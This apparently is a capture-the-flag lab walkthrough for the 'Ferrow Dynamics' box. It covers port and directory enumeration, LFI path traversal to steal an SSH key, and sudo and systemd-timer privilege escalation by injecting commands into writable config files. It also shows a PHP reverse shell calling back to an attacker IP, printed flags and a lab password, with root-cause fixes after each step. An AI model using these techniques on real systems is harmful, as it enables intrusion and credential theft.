Phase 1 — Reconnaissance

1.1 Full TCP port scan

nmap -sC -sV -p- 192.168.118.131
PORT     STATE SERVICE VERSION
22/tcp   open ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.16
80/tcp   open http     Apache httpd 2.4.52 ((Ubuntu))   -> "Ferrow Dynamics"
8000/tcp open http     BaseHTTPServer 0.6 (Python 3.10) -> "Ferrow Engineering Portal"

Three services, two of them HTTP. The -p- flag matters here — a default top-1000 scan would still have caught 8000, but on a real assessment always run the full range first; services deliberately placed on high ports are a common way boxes (and real internal hosts) hide an "internal-only" admin panel. Two web servers on different ports/stacks (Apache/PHP vs. a bare Python BaseHTTPServer) is a strong signal that the two apps were written independently and may trust each other — worth treating as two separate attack surfaces rather than one.

1.2 Directory / content discovery

gobuster dir -u http://192.168.118.131 -w /usr/share/wordlists/dirb/common.txt
.htpasswd     403       admin.php     302 -> /login.php
assets        301       includes      301
index.php     200       uploads       301
server-status 403

gobuster only checks the wordlist against raw paths, so it missed the .php pages that don't collide with common.txt entries. Following up with feroxbuster (which recurses and extracts links from returned HTML) filled in the gaps:

feroxbuster -u http://192.168.118.131 -w /usr/share/wordlists/dirb/common.txt
200   documents.php
200   login.php
200   team.php
302   admin.php        -> /login.php
200   index.php
200   assets/style.css
Lesson for your own recon habit. gobuster with a static wordlist and feroxbuster with link-extraction + recursion are complementary, not redundant. Running only one of them would have hidden either admin.php's redirect chain or the extra .php pages here. Also worth noting: none of these tools found engineering-preview.php — it wasn't linked anywhere discoverable by wordlist, it only surfaced from a hint left in the site's own content (see 2.1). That's a deliberate reminder that automated enumeration has to be paired with actually reading every page you find.

Phase 2 — Path 1: LFI / Path Traversal → SSH Key Theft

2.1 Finding the vulnerable parameter

The homepage's "Engineering" card pointed at a legacy engineering preview endpoint that takes a file query parameter and echoes the named file back inside a <pre> block:

curl -sS 'http://192.168.118.131/engineering-preview.php?file=q3-engineering-brief.txt'
...
<h1>q3-engineering-brief.txt</h1>
<pre class="preview">
Ferrow Dynamics Engineering Brief — Q3
Renata Voss, DevOps Engineer, is coordinating the legacy access review.
The legacy preview endpoint is retained for compatibility with engineering records.
</pre>

This is a textbook Local File Inclusion / arbitrary file read pattern: a developer-facing "preview" feature that reads whatever filename it's given, with no check that the name stays inside an intended documents folder. The brief itself is planted flavor text, but it does real work narratively — it names Renata Voss (rvoss) as the DevOps engineer responsible for "legacy access", which is the cue to go looking for an rvoss credential somewhere reachable from this same endpoint.

2.2 Escalating the read to path traversal

Because the parameter is passed straight into a filesystem read with no basename() / allow-list check, a relative path with ../ sequences walks back out of the documents directory:

curl -sS 'http://192.168.118.131/engineering-preview.php?file=../engineering-access/rvoss_id_ed25519' \
  -o rvoss_id_ed25519

chmod 600 rvoss_id_ed25519

The chmod 600 isn't optional flavor — OpenSSH refuses to use a private key file that's group- or world-readable ('UNPROTECTED PRIVATE KEY FILE' warning), so any downloaded key has to have its permissions tightened before ssh -i will even attempt to use it.

Root cause. The fix is never "reject ../" with a string filter — that's trivially bypassed (URL-encoding, double-encoding, absolute paths). The correct fix is to resolve the requested path with realpath() and verify it's still a descendant of the intended base directory before opening it, or better, map filenames to an internal allow-list/ID rather than touching the filesystem with user input at all.

Phase 3 — Path 1 Privilege Escalation: sudo + Writable Sourced Config

3.1 The sudo rule

sudo -l
User rvoss may run the following commands on afcc167fe8bc:
    (root) NOPASSWD: /usr/local/bin/ferrow-log-review

cat /usr/local/bin/ferrow-log-review
#!/bin/bash
set -euo pipefail
source /opt/ferrow/review/log-review.conf
printf 'Ferrow log review: %s\n' "${LOG_LABEL:-unlabelled}"

ls -ld /opt/ferrow/review
drwxrwxr-x 1 root rvoss 4096 ... /opt/ferrow/review
ls -l /opt/ferrow/review/log-review.conf
-rw-rw-r-- 1 root rvoss 40 ... log-review.conf

This is the classic "root script sources a file you can write" pattern, and it's worth understanding exactly why it works rather than just replaying the payload. sudo grants rvoss permission to execute /usr/local/bin/ferrow-log-review as root. That script itself is owned by root and rvoss can't edit it — but the first thing it does is source a config file that lives in a directory rvoss's group (rvoss, via the shared group on /opt/ferrow/review) has write access to. source (a.k.a. the . builtin) doesn't execute the file as a separate program — it reads it line-by-line into the current shell. Since the current shell is running as root (because it was invoked via sudo), anything that looks like a shell command inside that config file runs with root's privileges, not rvoss's.

3.2 The payload — command substitution, not just a string

A plain LOG_LABEL="..." assignment is just data. But bash performs command substitution during variable assignment: $(...) inside a double-quoted value is executed and its output is substituted in, before the assignment completes. So instead of setting a label string, the config file was rewritten to run an arbitrary command and stash its output in the variable:

printf 'LOG_LABEL=$(cat /root/root.txt)\n' > /opt/ferrow/review/log-review.conf
sudo /usr/local/bin/ferrow-log-review

Ferrow log review: THM{1ae6b733f8d88bf704760a3c5aba1cdf}
Flag 2 — root.txt (via LOG_LABEL injection)THM{1ae6b733f8d88bf704760a3c5aba1cdf}

The same trick was reused to read a second file that wasn't world-readable — an operations credential file only root could open directly:

printf 'LOG_LABEL=$(cat /root/web-operations-credentials.txt)\n' \
  > /opt/ferrow/review/log-review.conf
sudo /usr/local/bin/ferrow-log-review

Ferrow log review: Username: ops_review
Password: Harbor-Shift-26!

The ops_review / Harbor-Shift-26! credential is what opens the operations panel used in Path 2.

Watch the quoting. The two failed attempts before this succeeded are worth noting for your own habits: both broke because the terminal wrapped the printf '...' string across a line and the shell then treated the wrapped part as a second, unquoted command (bash: syntax error near unexpected token `newline'). Not a technique failure — a copy/paste + terminal-width quoting hazard. When a multi-line payload matters, write it to a small script file first (vi payload.sh) instead of composing it inline, especially over a narrow terminal or a reverse shell where line wrapping is unpredictable.
Root cause. Never grant a directory-write to the same principal (user or shared group) whose sudo rule sources a file from that directory. If a config really must be externally editable, the privileged script should read it as inert data (e.g. grep '^KEY=' file | cut -d= -f2) rather than source-ing it — source/. is functionally equivalent to eval on the whole file.

Phase 4 — Path 2: Web Shell Foothold → www-data

4.1 Landing the shell

The second path uses the classic pentestmonkey php-reverse-shell.php (IP/port edited to the attacker box, 192.168.179.71:4444), an authenticated file-upload point on the site, and a netcat listener:

nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.118.128] from (UNKNOWN) [192.168.118.131] 40310
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Honest gap in this write-up. The pasted session doesn't include the upload/trigger request itself — only the listener catching the callback. Since the room's own brief advertises 'authenticated operations staff can submit maintenance attachments' and the earlier LOG_LABEL trick surfaced the ops_review / Harbor-Shift-26! credential, the intended chain is: log into the operations panel with those creds, upload the reverse shell through the field-return/attachment form (the same /uploads/ directory feroxbuster flagged in Phase 1), then request the uploaded file to trigger it. That step is stated here as the intended chain — it is not presented as a captured request.

www-data could read /home/fieldops/user.txt directly (world-readable or group-accessible) without needing to become the fieldops user — a softer, "lateral flag" step distinct from a full account compromise. sudo -l as www-data required a TTY and password, so it was a dead end from this shell, which is the expected signal to go hunting for a different privilege boundary instead — in this case scheduled/background execution rather than sudo.

4.3 Finding the timer

systemctl list-timers --all | grep ferrow-field
ferrow-field-maintenance.timer   ferrow-field-maintenance.service

cat /etc/systemd/system/ferrow-field-maintenance.timer
[Timer]
OnBootSec=30s
OnUnitInactiveSec=30s
Unit=ferrow-field-maintenance.service

cat /etc/systemd/system/ferrow-field-maintenance.service
[Service]
Type=oneshot
User=root
Group=root
ExecStart=/usr/local/libexec/ferrow-field-maintenance

ls -l /usr/local/lib/ferrow-field-maintenance
-rwx------ 1 root root 395 ...

ls -l /var/lib/ferrow-field/maintenance.env
-rw-rw-r-- 1 root www-data 56 ... maintenance.env

Same underlying bug class as Phase 3, different transport: a root-owned systemd unit runs a script every 30 seconds (OnUnitInactiveSec=30s), and that script's behaviour is driven by an environment file (/var/lib/ferrow-field/maintenance.env) that's group-writable by www-data. systemd's EnvironmentFile= directive (or the script doing its own source/export of that file — either way the effect is identical) means whatever key/value pairs are in that file get interpreted as shell variables inside a process that Type=oneshot + User=root guarantees runs as root.

4.4 The injection

echo 'FIELD_TASK="cat /root/final-root.txt"' | tee /var/lib/ferrow-field/maintenance.env >/dev/null
sleep 35
cat /var/lib/ferrow-field/latest-report.txt
THM{685fa66fd983a714e4d4bc8afad99f72}
Flag 4 — final-root.txtTHM{685fa66fd983a714e4d4bc8afad99f72}

Same command-substitution idea as Phase 3's LOG_LABEL, but the exploitation primitive here is a bit different and worth distinguishing: FIELD_TASK isn't consumed via $(...) substitution when the file is written — instead the service's own script almost certainly does something like eval "$FIELD_TASK" or $FIELD_TASK unquoted, executing whatever command string the variable holds directly. Either mechanism collapses to the same root cause: a value an unprivileged user can set is later treated as executable code by a root-privileged process. The earlier failed attempts (a literal \n inside a multi-line printf ... > redirect) are the same terminal-wrapping quoting trap seen in Phase 3 — switching to echo '...' | tee as a single unbroken line sidestepped it. The 35-second sleep is simply waiting out the timer's 30-second OnUnitInactiveSec interval so the service fires again and picks up the modified environment file.

Root cause. Never let an unprivileged-writable file feed values into a root-run process without both (a) a strict allow-list of permitted keys/values, and (b) treating every value as inert data, never as something passed through eval, source, or unquoted expansion. If a systemd service genuinely needs a user-tunable field, validate it in the service's own code with a fixed set of accepted values, not free-form shell text.

Two independent kill chains, same underlying bug class

  • Path 1: unauthenticated LFI (engineering-preview.php) → SSH private key disclosure → NOPASSWD sudo rule → root-run script sources a group-writable config → command substitution in the sourced value → root.
  • Path 2: authenticated upload → PHP web shell → www-data → group-writable environment file feeding a root-owned systemd timer → injected command string → root.
  • Both privilege-escalation steps are the same idea wearing a different hat: a root-privileged process consumes attacker-controlled text as if it were trusted code, via source in one case and EnvironmentFile/eval in the other. That repetition is a good teaching point — it shows the same GTFOBins-adjacent pattern ("who can write what a root process later interprets as code") surfacing through two completely different services.
